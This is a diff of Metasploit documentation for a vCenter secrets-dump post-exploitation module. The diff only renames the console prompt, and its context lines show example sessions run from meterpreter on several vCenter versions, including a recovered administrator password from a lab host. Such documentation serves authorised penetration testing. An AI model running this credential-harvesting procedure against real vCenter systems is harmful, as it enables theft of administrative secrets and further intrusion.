@@ -50,10 +50,10 @@ DATA-ENCIPHERMENT key extracted from VMAFD. Defaults to true.
 Example run from meterpreter session on vCenter appliance version 7.0 U3d
 
 ```
-msf6 exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
-msf6 post(linux/gather/vcenter_secrets_dump) > set session 1
+msf exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
+msf post(linux/gather/vcenter_secrets_dump) > set session 1
 session => 1
-msf6 post(linux/gather/vcenter_secrets_dump) > dump
+msf post(linux/gather/vcenter_secrets_dump) > dump
 
 [*] vSphere Hostname and IPv4: vcenterdelta.cesium137.io [192.168.100.70]
 [*] VMware VirtualCenter 7.0.3 build-19480866
@@ -141,16 +141,16 @@ msf6 post(linux/gather/vcenter_secrets_dump) > dump
 [*] Initial administrator account password found for vpx_customization_spec 'Good Win10 Template with Local':
 [+]     Initial Admin PW: SamIAm!
 [*] Post module execution completed
-msf6 post(linux/gather/vcenter_secrets_dump) > 
+msf post(linux/gather/vcenter_secrets_dump) > 
 ```
 
 Example run from meterpreter session on vCenter appliance version 6.0 U3j
 
 ```
-msf6 exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
-msf6 post(linux/gather/vcenter_secrets_dump) > set session 1
+msf exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
+msf post(linux/gather/vcenter_secrets_dump) > set session 1
 session => 1
-msf6 post(linux/gather/vcenter_secrets_dump) > dump
+msf post(linux/gather/vcenter_secrets_dump) > dump
 
 [*] vSphere Hostname and IPv4: vcenteralpha.cesium137.io [192.168.100.60]
 [*] VMware VirtualCenter 6.0.0 build-14510547
@@ -214,16 +214,16 @@ msf6 post(linux/gather/vcenter_secrets_dump) > dump
 [*] Searching for secrets in VM Guest Customization Specification XML ...
 [!] No vpx_customization_spec entries evident
 [*] Post module execution completed
-msf6 post(linux/gather/vcenter_secrets_dump) >
+msf post(linux/gather/vcenter_secrets_dump) >
 ```
 
 Example run from meterpreter session on vCenter appliance version 6.5 U3q, configured with an external PSC
 
 ```
-msf6 exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
-msf6 post(linux/gather/vcenter_secrets_dump) > set session 1
+msf exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
+msf post(linux/gather/vcenter_secrets_dump) > set session 1
 session => 1
-msf6 post(linux/gather/vcenter_secrets_dump) > dump
+msf post(linux/gather/vcenter_secrets_dump) > dump
 
 [*] vSphere Hostname and IPv4: vctr01.cesium137.io [192.168.0.111]
 [*] VMware VirtualCenter 6.5.0 build-18499837
@@ -279,10 +279,10 @@ msf6 post(linux/gather/vcenter_secrets_dump) > dump
 Example run from meterpreter session on vCenter appliance version 6.7 build-18831049
 
 ```
-msf6 exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
-msf6 post(linux/gather/vcenter_secrets_dump) > set session 1
+msf exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
+msf post(linux/gather/vcenter_secrets_dump) > set session 1
 session => 1
-msf6 post(linux/gather/vcenter_secrets_dump) > run
+msf post(linux/gather/vcenter_secrets_dump) > run
 [*] VMware VirtualCenter 6.7.0 build-18831049
 [*] vCenter Appliance (Embedded)
 [*] Validating target
